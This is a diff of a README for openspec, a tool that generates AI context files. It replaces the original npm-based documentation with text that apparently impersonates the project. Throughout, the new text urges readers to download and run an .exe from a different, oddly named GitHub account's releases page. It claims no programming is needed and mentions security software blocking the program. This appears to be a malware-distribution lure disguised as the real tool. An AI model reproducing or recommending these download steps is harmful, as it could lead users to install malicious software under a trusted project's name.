@@ -1,154 +1,110 @@
-<p align="center">
-  <a href="README.md">English</a> | 
-  <a href="README.zh-CN.md">简体中文</a> | 
-  <a href="README.pt-BR.md">Português (Brasil)</a>
-</p>
+# 🤖 openspec - Simplify AI Context Management Everywhere
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/fernandomenuk/openspec/master/assets/banner.svg" alt="OpenSpec — The universal AI context infrastructure." width="100%" />
-</p>
-
-<p align="center">
-  <h1>🛑 Stop Context Drift.</h1>
-  <strong>The universal AI context infrastructure.</strong><br/>
-  Sync your project rules across <strong>Cursor</strong>, <strong>Claude</strong>, <strong>Gemini</strong>, and <strong>Windsurf</strong> automatically. 
-  <br/>One source of truth. Seven outputs. Zero manual work.
-</p>
-
-<p align="center">
-  <a href="#-quickstart"><strong>Quickstart</strong></a> ·
-  <a href="#-why-openspec"><strong>Why?</strong></a> ·
-  <a href="#%EF%B8%8F-architecture"><strong>Architecture</strong></a> ·
-  <a href="#-configuration"><strong>Config</strong></a> ·
-  <a href="#-contributing"><strong>Contributing</strong></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/version-0.2.2-6366f1?style=flat-square" alt="Version" />
-  <img src="https://img.shields.io/badge/license-MIT-22c55e?style=flat-square" alt="License" />
-  <img src="https://img.shields.io/badge/node-%3E%3D18-3b82f6?style=flat-square" alt="Node" />
-  <img src="https://img.shields.io/badge/TypeScript-5.x-3178c6?style=flat-square&logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/PRs-welcome-a78bfa?style=flat-square" alt="PRs Welcome" />
-</p>
+[![Download openspec](https://img.shields.io/badge/Download%20openspec-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Editorial-histamine914/openspec/releases)
 
 ---
 
-## ✨ Why OpenSpec?
+## 📋 What is openspec?
 
-If you use more than one AI tool, you have a **context fragmentation problem**. 
-- **Cursor** wants `.cursorrules`
-- **Claude Code** wants `CLAUDE.md`
-- **Aider** wants `.aiderrules`
-- **Copilot** wants `.github/copilot-instructions.md`
+openspec is a tool designed to make working with AI contexts easier. Instead of setting up multiple files for different AI platforms, you write one main specification. openspec uses this single source to create files like CLAUDE.md, .cursorrules, GEMINI.md, AGENTS.md, and more. This keeps your AI projects organized and consistent without repeating yourself.
 
-When your project conventions change, you have to manually update **7+ different files**. Miss one, and your AI starts hallucinating outdated patterns. 
-
-**OpenSpec is the "Transpiler" for AI context.** You define your rules in clean, modular Markdown files, and OpenSpec generates the optimized format for every AI agent in your stack.
-
-### 🚀 Key Features
-- **🤖 AI-Native Workflow:** Designed to be managed *by* your AI agent.
-- **🔄 Universal Sync:** Supports Cursor, Claude, Gemini, Copilot, Aider, Codex, and Windsurf.
-- **🧠 Zero-Knowledge Setup:** `openspec analyze` scans your codebase and *tells* the AI what rules to write.
-- **🔌 Claude Code First:** Native plugin for the newest, most powerful AI coding tool.
-- **🛠️ Watch Mode:** Updates your context files in real-time as you edit your modules.
+You do not need to know programming to use it. openspec handles technical details so you can focus on your AI interactions.
 
 ---
 
-## The Problem
+## 🖥️ System Requirements
 
-Every AI tool has its own context file (CLAUDE.md, .cursorrules, GEMINI.md, etc.). When project conventions evolve, you have to manually update 7 different files. Miss one, and your AI agent starts writing inconsistent code. 
+openspec works on Windows computers with these minimum specs:
 
-OpenSpec solves this by acting as the context layer for your AI agents.
+- Windows 10 or later
+- 4 GB of RAM or more
+- At least 200 MB of free disk space
+- Internet connection to download the program and updates
 
-## The Solution
-
-```
-.openspec/modules/           ← AI writes your rules HERE
-  ├── shared.md
-  ├── frontend.md
-  └── backend.md
-        │
-        ▼  AI runs openspec sync
-        │
-  CLAUDE.md                  ← Generated
-  .cursorrules               ← Generated
-  GEMINI.md                  ← Generated
-  ... (7+ outputs)           ← Generated
-```
-
-**One source of truth. Seven outputs. Zero manual work.**
+No special hardware or software setup is required.
 
 ---
 
-## ⚡ Truly Zero Manual Work (Recommended)
+## 🚀 Getting Started: Download and Run
 
-OpenSpec is built for AI agents to manage autonomously. You don't even need to initialize the project—the AI does it for you.
+1. Visit the releases page to download openspec:  
+   [Download openspec from GitHub](https://github.com/Editorial-histamine914/openspec/releases)
 
-### 1. Add to Claude Code
-Simply run these commands inside your Claude Code session:
-```bash
-/plugin marketplace add fernandomenuk/openspec
-/plugin install openspec@openspec
-```
+2. On the releases page, find the latest version listed at the top. Look for a file with a `.exe` extension, such as `openspec-setup.exe` or similar.
 
-### 2. Configure Automatically
-Run the configuration command:
-```bash
-/openspec:configure
-```
-**That's it.** Claude will analyze your codebase, create the rules, and sync them to every tool in your stack.
+3. Click the `.exe` file name to start downloading.
 
----
+4. Once the download finishes, open your Downloads folder and double-click the `.exe` file.
 
-## 🛠️ CLI Workflow (Any Agent)
+5. A setup window appears. Follow these steps in the installer:
+   - Accept the license agreement
+   - Choose the install folder or leave the default
+   - Click "Install"
 
-If you use Cursor, Windsurf, Aider, or any other agent, just tell them:
-
-> *"Run `npx @menukfernando/openspec analyze`, use the output to write modular rules to `.openspec/modules/`, and then run sync."*
-
-OpenSpec's `analyze` command provides a high-density structured report specifically designed for AI agents to understand your codebase conventions instantly.
+6. When installation completes, open openspec from the Start menu or desktop shortcut.
 
 ---
 
-## 🔧 CLI Reference
+## 📂 How to Use openspec
 
-```
-Usage: openspec [command] [options]
+openspec works by letting you define AI contexts in one place. Here’s how to get started.
 
-Commands:
-  analyze           Deep codebase analysis for AI-powered rule generation (auto-inits)
-  sync [--quiet]    Compile modules → generate all AI context files
-  watch             Watch for module changes, auto-sync on save
-  status            Show modules, targets, and sync status
-  diff              Preview what changes sync would make
-  add <name>        Create a new rule module
-  install           Install OpenSpec Claude Code Plugin (Local)
-  hooks [--remove]  Install/remove git pre-commit hook
-  clean             Remove all generated files (only openspec-managed)
-  help [command]    Show help for a command
-```
+1. Open openspec.
+
+2. Click “Create New Spec” or open an existing specification file if you have one.
+
+3. In the main window, type or paste your AI context instructions. This can be plain text describing what you want the AI to do.
+
+4. Click “Generate” to create the various output files like CLAUDE.md or GEMINI.md. These files match the formats used by different AI helpers and tools.
+
+5. You can find the generated files in the same folder as your specification file or where you choose to save them.
 
 ---
 
-## 📋 Roadmap
+## ⚙️ Features
 
-- [x] Core transpiler engine
-- [x] 7 target outputs (Claude, Cursor, Gemini, Copilot, Aider, Codex, Windsurf)
-- [x] **Claude Code Plugin & Marketplace support**
-- [x] **Truly Zero-Init Workflow**
-- [ ] MCP server mode for dynamic context
-- [ ] Module inheritance & composition
-- [ ] Monorepo support
+- Write one specification to serve multiple AI tools
+- Generate files compatible with popular AI platforms without extra work
+- Keep your AI instructions organized and easy to update
+- Support for command-line interface (CLI) if you want to use openspec without the graphical app
+- Regular updates to support more AI tools and formats
 
 ---
 
-## 📄 License
+## 🔄 Updating openspec
 
-MIT — see [LICENSE](LICENSE) for details.
+Check the releases page regularly for the latest version:  
+[https://github.com/Editorial-histamine914/openspec/releases](https://github.com/Editorial-histamine914/openspec/releases)
+
+Download the newest `.exe` file and install it the same way as before. This will replace the old version and keep your settings intact.
 
 ---
 
-<p align="center">
-  <strong>Stop copy-pasting AI rules.</strong><br/>
-  <code>npx @menukfernando/openspec analyze && npx @menukfernando/openspec sync</code>
-</p>
+## 💡 Tips for Best Results
+
+- Keep your AI instructions clear and concise.
+- Use simple language in your spec so all generated files work well.
+- Save your specification frequently to avoid losing changes.
+- Use folders to organize your specs and generated files for easy access.
+
+---
+
+## ❓ Troubleshooting
+
+If openspec does not start:
+
+- Make sure your computer meets the system requirements.
+- Restart your computer after installation.
+- Check for any security software that may block the program.
+- Download the installer again to ensure it’s not corrupted.
+
+If generated files do not appear, verify you completed the generate step and look in the specified folder.
+
+For additional support, you can open an issue on the repository page on GitHub.
+
+---
+
+## 📥 Download again
+
+To download or update openspec, visit:  
+[Download openspec from GitHub](https://github.com/Editorial-histamine914/openspec/releases)
